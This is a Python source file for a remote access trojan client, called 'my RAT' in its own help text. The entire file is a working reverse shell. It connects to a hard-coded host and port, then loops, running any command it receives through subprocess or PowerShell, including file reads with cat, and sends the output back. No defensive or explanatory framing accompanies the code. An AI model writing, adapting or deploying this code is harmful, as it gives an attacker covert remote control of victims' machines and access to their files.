
import socket
import subprocess
import os


class ClientClass:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.curdir = os.getcwd()
        self.BUFFER_SIZE = 1024 * 128
        self.SEPARATOR = "\n\n"

    def connection(self):
        try:
            global client
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.ip, self.port))
            firstmassage = f'\n{self.curdir} >> '
            client.send(firstmassage.encode())
        except Exception as error:
            print(error)

    def cexe(self):
        while True:
            # receive the commands
            command = client.recv(self.BUFFER_SIZE).decode()
            splited_command = command.split()

            if splited_command[0].lower() == "exit":
                client.close()

            elif splited_command[0].lower() == "man":
                output = """
                man page for my RAT:
                exit - Exit Shell
                cd - Change Directory
                ls - List Directory
                pwd - Working Directory
                cat - Show file content
                """
            elif splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except Exception as error:
                    # if there is an error, set as the output
                    output = str(error)
                else:
                    # if operation is successful, empty message
                    output = ""

            elif splited_command[0].lower() == "ls":
                output = subprocess.check_output(['powershell.exe',
                                                  'ls'],
                                                 encoding='utf-8')

            elif splited_command[0].lower() == "pwd":
                output = subprocess.check_output(['powershell.exe',
                                                  'pwd'],
                                                 encoding='utf-8')

            elif splited_command[0].lower() == "cat":
                try:
                    output = subprocess.check_output(['powershell.exe',
                                                      'cat',
                                                      ' '.join(splited_command[1:])],
                                                     encoding='utf-8')
                except Exception as error:
                    output = str(error)
                    pass

            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)

            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{self.SEPARATOR}{cwd} >> "
            client.send(message.encode())
        # close client connection
        client.close()


rat = ClientClass('10.211.55.7', 5555)


if __name__ == '__main__':
    rat.connection()
    rat.cexe()

